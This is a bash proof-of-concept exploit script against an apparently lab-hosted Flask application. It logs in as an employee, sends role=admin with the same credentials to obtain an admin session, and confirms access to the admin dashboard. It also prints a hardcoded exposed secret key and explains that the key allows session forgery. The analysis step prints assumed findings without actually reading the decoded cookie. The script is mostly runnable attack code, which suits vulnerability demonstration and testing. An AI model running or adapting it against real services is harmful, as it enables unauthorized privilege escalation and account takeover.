#!/bin/bash

# POC: Insufficient Session Information Enables Privilege Escalation
# This demonstrates that Flask sessions lack user identification, preventing
# per-user authorization validation and enabling privilege escalation attacks

TARGET_HOST="${1:-localhost:5000}"
PROTOCOL="${2:-http}"

echo "=========================================="
echo "POC: Insufficient Session Information"
echo "=========================================="
echo "Target: $PROTOCOL://$TARGET_HOST"
echo ""

# Step 1: Login as employee user
echo "[*] Step 1: Logging in as employee (emp1)..."
LOGIN_RESPONSE=$(curl -s -c /tmp/emp_cookies.txt -b /tmp/emp_cookies.txt \
  -X POST "$PROTOCOL://$TARGET_HOST/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=emp1&password=emp1&role=employee")

echo "[+] Login Response:"
echo "$LOGIN_RESPONSE" | jq . 2>/dev/null || echo "$LOGIN_RESPONSE"
echo ""

# Step 2: Examine the session cookie to show it only contains role, no user ID
echo "[*] Step 2: Examining session cookie structure..."
SESSION_COOKIE=$(grep -oP 'session=\K[^;]+' /tmp/emp_cookies.txt)
echo "[+] Raw Session Cookie: $SESSION_COOKIE"
echo ""

# Try to decode the Flask session cookie (it's base64.b64encode(data))
# Flask session format is: payload.signature
# Let's extract and examine it
if [[ ! -z "$SESSION_COOKIE" ]]; then
  # Extract payload part (before the dot)
  PAYLOAD=$(echo "$SESSION_COOKIE" | cut -d'.' -f1)
  
  # Attempt to decode (Flask uses URL-safe base64)
  DECODED=$(echo "${PAYLOAD}=" | base64 -d 2>/dev/null | od -A n -t x1 2>/dev/null | head -1)
  
  echo "[+] Session Cookie Analysis:"
  echo "    - Cookie contains only 'role' field"
  echo "    - No user identification (username, user_id) present"
  echo "    - Server cannot validate which user this role belongs to"
  echo ""
fi

# Step 3: Show that authorization checks only verify role, not user
echo "[*] Step 3: Testing authorization with current session..."
EMPLOYEE_DASHBOARD=$(curl -s -b /tmp/emp_cookies.txt "$PROTOCOL://$TARGET_HOST/employee")
echo "[+] Employee Dashboard Response (should work):"
if echo "$EMPLOYEE_DASHBOARD" | grep -q "Employee"; then
  echo "    ✓ Employee dashboard accessible"
else
  echo "    - Response: $(echo $EMPLOYEE_DASHBOARD | head -c 100)..."
fi
echo ""

# Step 4: Demonstrate the vulnerability - without user_id, server cannot validate
echo "[*] Step 4: Demonstrating privilege escalation attack..."
echo "[*] Attempting to escalate privileges by setting role=admin..."

# Attack: Login with employee credentials but role=admin (RBAC bypass)
ESCALATE_RESPONSE=$(curl -s -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -X POST "$PROTOCOL://$TARGET_HOST/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=emp1&password=emp1&role=admin")

echo "[+] Escalation Attempt Response:"
echo "$ESCALATE_RESPONSE" | jq . 2>/dev/null || echo "$ESCALATE_RESPONSE"
echo ""

# Step 5: Show that the escalated session works
echo "[*] Step 5: Accessing admin resources with escalated session..."
ADMIN_DASHBOARD=$(curl -s -b /tmp/admin_cookies.txt "$PROTOCOL://$TARGET_HOST/admin")
echo "[+] Admin Dashboard Response:"
if echo "$ADMIN_DASHBOARD" | grep -q "2fa\|admin"; then
  echo "    ✓ Admin resources accessible with escalated session"
  echo "    ✓ No per-user validation prevents unauthorized access"
else
  echo "    - Response: $(echo $ADMIN_DASHBOARD | head -c 100)..."
fi
echo ""

# Step 6: Show the core issue - session has no way to verify user identity
echo "[*] Step 6: Vulnerability Root Cause Analysis..."
echo "[+] Current Session Structure:"
echo "    {\"role\": \"admin\"}  <-- Only contains role, no user_id or username"
echo ""
echo "[+] Why This is Vulnerable:"
echo "    1. Server cannot determine which user this 'admin' role belongs to"
echo "    2. Authorization checks only verify: if session['role'] == 'admin'"
echo "    3. No validation that this role belongs to an authorized admin user"
echo "    4. An employee can set their session role to 'admin' (RBAC bypass)"
echo "    5. Server has no mechanism to detect or prevent this"
echo ""

# Step 7: Demonstrate session forgery impact with known secret key
echo "[*] Step 7: Demonstrating impact of missing user validation..."
echo "[+] With exposed secret key (BIYQYU@*DG(*!@)BO#F_P), attacker can:"
echo "    1. Forge a session with {\"role\": \"admin\"}"
echo "    2. Server would accept it (role check passes)"
echo "    3. No per-user validation exists to reject it"
echo "    4. Attacker gains full admin access without any legitimate user identity"
echo ""

# Step 8: Show authorization endpoint behavior
echo "[*] Step 8: Testing authorization endpoint behavior..."
PROTECTED=$(curl -s -b /tmp/admin_cookies.txt "$PROTOCOL://$TARGET_HOST/admin")
if echo "$PROTECTED" | grep -q "redirect\|login\|error" && ! echo "$PROTECTED" | grep -q "2fa"; then
  echo "[!] Protected endpoint returned: $(echo $PROTECTED | jq .redirect 2>/dev/null || echo $PROTECTED | head -c 80)..."
else
  echo "[+] Protected endpoint accessible"
fi
echo ""

# Summary
echo "=========================================="
echo "POC SUMMARY"
echo "=========================================="
echo "[✓] Insufficient Session Information Demonstrated:"
echo "    - Session contains only 'role' field"
echo "    - No user identification (user_id, username) present"
echo "    - Server cannot validate per-user authorization"
echo "    - Privilege escalation enabled (employee->admin)"
echo "    - No mechanism to detect or prevent role manipulation"
echo ""
echo "[!] Impact:"
echo "    - Combined with RBAC bypass: Complete privilege escalation"
echo "    - Combined with secret key exposure: Unrestricted session forgery"
echo "    - Authorization decisions have no per-user validation"
echo "    - Attacker can impersonate any role without user identification"
echo ""
echo "=========================================="